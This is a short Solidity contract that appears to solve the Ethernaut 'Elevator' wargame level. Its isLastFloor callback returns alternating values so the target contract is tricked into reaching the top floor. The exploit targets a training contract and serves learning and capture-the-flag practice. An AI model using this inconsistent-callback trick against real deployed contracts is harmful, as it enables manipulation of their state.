// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../levels/Elevator.sol";

contract ElevatorAttack is Building {
    bool top;

    function attack(address target) external {
        Elevator(target).goTo(0);
    }

    function isLastFloor(uint256) external override returns (bool) {
        bool _top = top;
        top = !top;
        return _top;
    }
}
